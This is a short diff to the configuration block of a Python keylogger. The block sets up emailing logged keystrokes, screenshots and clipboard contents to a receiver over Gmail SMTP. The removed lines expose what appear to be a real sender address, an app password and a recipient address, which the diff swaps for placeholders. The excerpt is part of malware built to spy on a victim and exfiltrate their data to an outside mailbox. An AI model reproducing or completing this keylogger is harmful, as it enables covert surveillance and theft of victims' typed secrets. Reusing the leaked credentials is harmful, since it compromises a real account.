@@ -11,16 +11,16 @@ import pyautogui
 import win32clipboard
 
 # Email Configuration
-email_user = 'mohammadmohammad47117@gmail.com'
-email_password = 'wyui ynli bmiz dgbw'
-email_to = 'abdulahadneriya@gmail.com'  # Updated email receiver
+email_user = 'send-email@gmail.com'
+email_password = 'password'
+email_to = 'receiver-email@gmail.com'  # Updated email receiver
 smtp_server = 'smtp.gmail.com'
 smtp_port = 587
 email_subject = 'Logged Keys and Screenshots'
 
 # File Configuration
 keystroke_file = 'keys.txt'
-screenshot_folder = 'D:/keylogger/screenshots/'
+screenshot_folder = 'screenshot_folder_path'
 clipboard_file = 'clipboard.txt'
 
 # Create the screenshots directory if it doesn't exist
